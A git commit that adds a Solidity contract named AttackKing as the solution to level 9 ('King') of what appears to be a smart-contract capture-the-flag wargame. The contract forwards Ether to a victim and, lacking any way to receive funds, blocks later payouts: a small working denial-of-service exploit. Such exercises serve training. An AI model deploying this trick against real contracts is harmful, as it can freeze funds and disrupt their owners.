301081a603d6c2d5245c9327bbce046d87e2a117
alex0207s <alex640702070829@gmail.com>
2023-05-13 23:14:12 +0800

    :white_check_mark: Add level 9 King solution

---
+++ src/levels/09-King/AttackKing.sol
@@ -0,0 +1,9 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackKing {
+    function attack(address victim) external payable{
+        (bool sent, ) = victim.call{value: msg.value}("");
+        require(sent, "Failed to send Ether");
+    }
+}
